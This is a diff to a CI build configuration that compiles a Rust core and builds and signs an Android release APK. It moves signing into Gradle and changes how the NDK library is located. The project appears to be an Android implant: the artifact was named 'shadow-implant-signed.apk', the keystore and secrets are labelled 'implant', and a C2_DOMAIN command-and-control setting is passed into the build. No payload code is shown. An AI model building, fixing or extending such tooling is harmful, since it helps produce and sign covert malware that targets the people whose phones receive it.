@@ -18,33 +18,33 @@ workflows:
       - name: Build Rust core
         script: |
           source "$HOME/.cargo/env"
-          # CodeMagic Android SDK is under $CM_KOTLIN_PATH / use SDKMAN-style env
-          export ANDROID_SDK_ROOT="${ANDROID_HOME:-$HOME/android-sdk}"
-          export ANDROID_NDK_HOME="${ANDROID_NDK_HOME:-$ANDROID_SDK_ROOT/ndk/}"
           cargo install cargo-ndk --version 3.5.4 || cargo install cargo-ndk
           cd core
           cargo ndk -t arm64-v8a -o android/app/src/main/jniLibs build --release
-          echo "NDK path: $ANDROID_NDK_HOME"
-          find "$ANDROID_SDK_ROOT" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1
       - name: Copy libc++_shared
         script: |
-          LIB=$(find "$ANDROID_SDK_ROOT" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1)
-          if [ -n "$LIB" ]; then cp "$LIB" core/android/app/src/main/jniLibs/arm64-v8a/; fi
-      - name: Build APK
+          NDK_LIB=$(find "$HOME/android-sdk" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1)
+          if [ -z "$NDK_LIB" ]; then
+            # try the CodeMagic-installed NDK location
+            NDK_LIB=$(find "$HOME" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1)
+          fi
+          echo "libc++_shared: $NDK_LIB"
+          if [ -n "$NDK_LIB" ]; then
+            mkdir -p core/android/app/src/main/jniLibs/arm64-v8a
+            cp "$NDK_LIB" core/android/app/src/main/jniLibs/arm64-v8a/
+          fi
+      - name: Build APK (Gradle signs)
         script: |
           cd core/android
-          chmod +x gradlew
-          export C2_DOMAIN="$C2_DOMAIN"
-          ./gradlew assembleRelease
-      - name: Sign APK
-        script: |
-          cd core/android
-          curl -sSL -o /tmp/bt.zip https://dl.google.com/android/repository/build-tools_r34-linux.zip
-          python3 -c "import zipfile; z=zipfile.ZipFile('/tmp/bt.zip'); open('/tmp/apksigner.jar','wb').write(z.read([n for n in z.namelist() if n.endswith('apksigner.jar')][0]))"
+          # Keystore for the gradle release signing config (reads env vars)
           echo "$IMPLANT_KEYSTORE_BASE64" | base64 -d > app/implant.jks
-          IN=$(ls app/build/outputs/apk/release/*.apk | head -n1)
-          OUT=app/build/outputs/apk/release/shadow-implant-signed.apk
-          java -jar /tmp/apksigner.jar sign --ks app/implant.jks --ks-key-alias "$IMPLANT_KEY_ALIAS" --ks-pass "pass:$IMPLANT_KEYSTORE_PASS" --key-pass "pass:$IMPLANT_KEY_PASS" --out "$OUT" "$IN"
-          java -jar /tmp/apksigner.jar verify -v "$OUT" | head -6
+          export IMPLANT_KEYSTORE_PATH="app/implant.jks"
+          export IMPLANT_KEY_ALIAS="$IMPLANT_KEY_ALIAS"
+          export IMPLANT_KEYSTORE_PASS="$IMPLANT_KEYSTORE_PASS"
+          export IMPLANT_KEY_PASS="$IMPLANT_KEY_PASS"
+          export C2_DOMAIN="$C2_DOMAIN"
+          chmod +x gradlew
+          ./gradlew assembleRelease
+          ls -la app/build/outputs/apk/release/
     artifacts:
-      - core/android/app/build/outputs/apk/release/shadow-implant-signed.apk
+      - core/android/app/build/outputs/apk/release/*.apk
